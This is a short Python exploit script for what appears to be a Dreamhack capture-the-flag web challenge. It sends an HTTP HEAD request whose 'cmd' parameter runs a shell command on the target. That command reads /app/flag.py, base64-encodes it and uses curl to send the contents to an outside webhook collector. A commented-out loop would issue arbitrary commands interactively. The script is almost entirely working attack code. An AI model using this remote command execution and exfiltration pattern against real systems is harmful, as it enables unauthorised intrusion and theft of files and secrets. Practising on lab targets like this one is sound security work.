from bs4 import BeautifulSoup
import requests


if __name__ == "__main__":
    url = "http://host3.dreamhack.games:23075"
    webhook = "https://2a34ccbd-6990-4796-bfac-c380fecbb006.webhooksite.net"
    # while True:
    #     # cmd = input('cmd: ').strip().replace('\r', '') 
    #     cmd = f"curl -s {webhook}/?flag=$(cat /app/flag.py | base64 | tr -d '\\n')"
    #     req = requests.head(url+'/', params={'cmd':cmd})
    #     print(BeautifulSoup(req.text, 'html.parser'))
    requests.head(url+'/', params={'cmd':f"curl -s {webhook}/?flag=$(cat /app/flag.py | base64 | tr -d '\\n')"})